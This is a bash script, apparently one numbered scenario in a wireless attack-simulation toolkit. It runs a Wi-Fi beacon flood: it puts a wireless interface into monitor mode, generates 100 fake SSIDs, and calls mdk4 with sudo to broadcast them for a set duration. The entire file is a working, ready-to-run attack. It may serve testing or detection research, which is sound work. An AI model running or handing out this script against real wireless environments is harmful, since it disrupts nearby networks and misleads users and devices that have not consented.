#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SERVICES_DIR="$BASH_DIR/services"
SCENARIO_DIR="$BASH_DIR/scenarios"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t008.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# ─── Run Attack ───
ensure_monitor_mode

SSID_FILE="$UTILITIES_DIR/$T008_SSID_FILE"

if [[ -f "$SSID_FILE" ]]; then
    print_blank
    print_info "Using existing SSID list: $T008_SSID_FILE"
else
    print_blank
    print_action "Generating SSID list: $T008_SSID_FILE"
    seq -f "SSID-%03g" 1 100 > "$SSID_FILE"
    print_success "Generated 100 SSIDs"
fi

print_blank
print_info "Running T008 - Beacon Flood attack for $T008_DURATION seconds"
sudo timeout "$T008_DURATION" mdk4 "$INTERFACE" b -f "$SSID_FILE" -s "$T008_INTERVAL"

EXIT_CODE=$?

ensure_managed_mode

if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0